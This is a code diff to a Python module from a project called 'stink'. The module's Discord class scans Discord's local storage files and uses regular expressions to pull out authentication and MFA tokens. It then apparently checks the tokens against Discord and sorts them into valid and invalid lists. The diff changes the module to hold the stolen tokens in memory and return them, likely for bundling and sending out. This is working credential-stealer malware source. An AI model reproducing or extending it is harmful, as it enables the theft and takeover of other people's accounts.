@@ -1,10 +1,11 @@
 from re import findall
 from json import loads
 from threading import Thread
-from typing import MutableMapping
-from os import listdir, path, makedirs
+from os import listdir, path
 from urllib.request import Request, urlopen
+from typing import MutableMapping, List, Dict
 
+from stink.helpers import MemoryStorage
 from stink.helpers.config import DiscordConfig
 
 
@@ -12,25 +13,13 @@ class Discord:
     """
     Collects tokens from the Discord.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
+        self.__file = path.join(folder, "Tokens.txt")
         self.__config = DiscordConfig()
+        self.__storage = MemoryStorage()
 
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the Discord module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            makedirs(self.__full_path)
-
-    def __get_headers(self, token: str = None, content_type: str = "application/json") -> dict:
+    def __get_headers(self, token: str = None, content_type: str = "application/json") -> Dict:
         """
         Composes the headers for the query.
 
@@ -78,6 +67,7 @@ class Discord:
         - None.
         """
         if not path.exists(self.__config.TokensPath):
+            print(f"[Discord]: No Discord found")
             return
 
         tokens = []
@@ -90,14 +80,12 @@ class Discord:
             if file[-4:] not in [".log", ".ldb"]:
                 continue
 
-            for data in [line.strip() for line in open(rf"{self.__config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
+            for data in [line.strip() for line in open(path.join(self.__config.TokensPath, file), "r", errors="ignore", encoding="utf-8").readlines()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                     [tokens.append(item) for item in findall(regex, data)]
 
         if not tokens:
             return
-
-        self.__create_folder()
 
         tasks = []
 
@@ -124,14 +112,12 @@ class Discord:
                 result[0]
             ))
 
-        with open(path.join(self.__full_path, "Tokens.txt"), "a", encoding="utf-8") as discord:
+        self.__storage.add_from_memory(
+            self.__file,
+            "Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n" + "".join(item for item in temp)
+        )
 
-            discord.write("Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n")
-            discord.write("".join(item for item in temp))
-
-        discord.close()
-
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the Discord tokens collection module.
 
@@ -144,6 +130,8 @@ class Discord:
         try:
 
             self.__get_tokens()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[Discord]: {repr(e)}")
